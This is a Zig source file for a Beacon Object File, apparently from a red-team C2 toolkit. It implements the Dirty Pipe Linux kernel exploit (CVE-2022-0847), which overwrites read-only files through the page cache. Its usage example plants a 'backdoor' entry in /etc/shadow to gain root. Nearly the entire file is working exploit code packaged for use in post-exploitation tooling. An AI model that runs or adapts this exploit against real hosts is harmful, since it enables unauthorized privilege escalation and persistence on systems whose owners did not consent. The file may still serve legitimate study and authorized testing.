///name: dirtypipe
///description: "Privilege escalation exploit for 'dirtypipe' vulnerability (CVE-2022-0847) against Linux Kernel"
///author: Z-Labs
///tags: ['linux','TA0004', 'T1068', 'z-labs']
///category: "Elevation-BOF"
///OS: Linux
///sources:
///    - 'https://raw.githubusercontent.com/The-Z-Labs/bof-launcher/main/bofs/src/dirtypipe.zig'
///examples: |
/// Basic usage of the BOF:
///   dirtypipe /etc/shadow 913 "backdoor:xxx:10123::::::"
///
/// Details about vulnerability and PoC exploit (author: Max Kellermann):
///   https://dirtypipe.cm4all.com/
///arguments:
///- name: file_path
///  desc: "path to a file that will be overwritten"
///  type: string
///  required: true
///- name: offset 
///  desc: "offset in overwritten file"
///  type: string
///  required: true
///- name: data
///  desc: "data to be written to the provided at provided offset"
///  type: string
///  required: true
///errors:
///- name: FdProcessLimit
///  code: 0x1
///  message: "Too many file descriptors for a process"
///- name: InvalidPipe
///  code: 0x2
///  message: "Pipe is invalid"
///- name: PageBoundryOffset
///  code: 0x3
///  message: "Page boundry would be crossed (offset % PAGE_SIZE == 0)"
///- name: FileOpenFailure
///  code: 0x4
///  message: "Failed to open file"
///- name: SpliceFailure
///  code: 0x5
///  message: "Failure during splicing"
///- name: WriteFailure
///  code: 0x6
///  message: "Failure during file write"
///- name: ShortWrite
///  code: 0x7
///  message: "File write not fully complete"
///- name: UnknownError
///  code: 0x8
///  message: "Unknown error"
const std = @import("std");
const bofapi = @import("bof_api");
const beacon = bofapi.beacon;

const PAGE_SIZE: u32 = 4096;

pub const LINUX_SPECIFIC_BASE = 1024;
pub const GETPIPE_SZ = LINUX_SPECIFIC_BASE + 8;

comptime {
    @import("bof_api").embedFunctionCode("memcpy");
    @import("bof_api").embedFunctionCode("memset");
    @import("bof_api").embedFunctionCode("memmove");
    @import("bof_api").embedFunctionCode("__aeabi_llsl");
    @import("bof_api").embedFunctionCode("__aeabi_uidiv");
    @import("bof_api").embedFunctionCode("__udivdi3");
    @import("bof_api").embedFunctionCode("__ashldi3");
    @import("bof_api").embedFunctionCode("__stackprobe__");
}

// BOF-specific error codes
const BofErrors = enum(u8) {
    FdProcessLimit = 1,
    InvalidPipe,
    PageBoundryOffset,
    FileOpenFailure,
    SpliceFailure,
    WriteFailure,
    ShortWrite,
    UnknownError,
};

//
// Create a pipe where all "bufs" on the pipe_inode_info ring have the
// PIPE_BUF_FLAG_CAN_MERGE flag set.
//
fn prepare_pipe(p: *[2]i32) !void {

    const rc = std.os.linux.pipe(p);
    if (rc == -1) {
        switch (std.os.linux.E.init(rc)) {
            .MFILE => return error.FdProcessLimit,
            else => return error.UnknownError,
        }
    }

    const pipe_size = std.os.linux.fcntl(p[1], GETPIPE_SZ, 0);
    if (rc == -1) {
        switch (std.os.linux.E.init(pipe_size)) {
            .BADF => return error.InvalidPipe,
            else => return error.UnknownError,
        }
    }

    var buffer: [4096]u8 = undefined;
    @memset(&buffer, 0);

    // fill the pipe completely; each pipe_buffer will now have
    // the PIPE_BUF_FLAG_CAN_MERGE flag
    var r: u32 = @intCast(pipe_size);
    while(r > 0) {
        var n: u32 = r;
        if(n > buffer.len)
            n = buffer.len;
        _ = std.os.linux.write(p[1], &buffer, n);
        r -= n;
    }

    // drain the pipe, freeing all pipe_buffer instances (but
    // leaving the flags initialized)
    r = @intCast(pipe_size);
    while(r > 0) {
        var n: u32 = r;
        if(n > buffer.len)
            n = buffer.len;
        _ = std.os.linux.read(p[0], &buffer, n);
        r -= n;
    }

    // the pipe is now empty, and if somebody adds a new
    // pipe_buffer without initializing its "flags", the buffer
    // will be mergeable
}

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    @import("bof_api").init(adata, alen, .{});

    var parser = beacon.datap{};
    beacon.dataParse(&parser, adata, alen);

    const path = beacon.dataExtract(&parser, null).?;
    var offset = @as(usize, @intCast(beacon.dataInt(&parser)));
    const data = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);

    if(@as(u32, @intCast(offset)) % PAGE_SIZE == 0)
        return @intFromEnum(BofErrors.PageBoundryOffset);

    const fd = std.os.linux.open(std.mem.sliceTo(path, 0), .{ .ACCMODE = .RDONLY }, 0);
    if(fd < 0)
        return @intFromEnum(BofErrors.FileOpenFailure);

    // create the pipe with all flags initialized with
    // PIPE_BUF_FLAG_CAN_MERGE
    var p: [2]i32 = undefined; 
    prepare_pipe(&p) catch 9;
    prepare_pipe(&p) catch |err| {
        switch (err) {
            //error.InvalidPipe => return @intFromEnum(BofErrors.InvalidPipe),
            error.FdProcessLimit => return @intFromEnum(BofErrors.FdProcessLimit),
            else => return @intFromEnum(BofErrors.UnknownError),
        }
    };

    // splice one byte from before the specified offset into the
    // pipe; this will add a reference to the page cache, but
    // since copy_page_to_iter_pipe() does not initialize the
    // "flags", PIPE_BUF_FLAG_CAN_MERGE is still set
    offset -= 1;

    var nbytes = std.os.linux.syscall6(std.os.linux.SYS.splice, fd, @intFromPtr(&offset), @intCast(p[1]), 0, 1, 0);
    if(nbytes <= 0)
        return @intFromEnum(BofErrors.SpliceFailure);
    
    // the following write will not create a new pipe_buffer, but
    // will instead write into the page cache, because of the
    // PIPE_BUF_FLAG_CAN_MERGE flag
    nbytes = std.os.linux.write(p[1], data.ptr, data.len);
    if(nbytes < 0)
        return @intFromEnum(BofErrors.WriteFailure);

    if(nbytes < data.len)
        return @intFromEnum(BofErrors.ShortWrite);

    return 0;
}
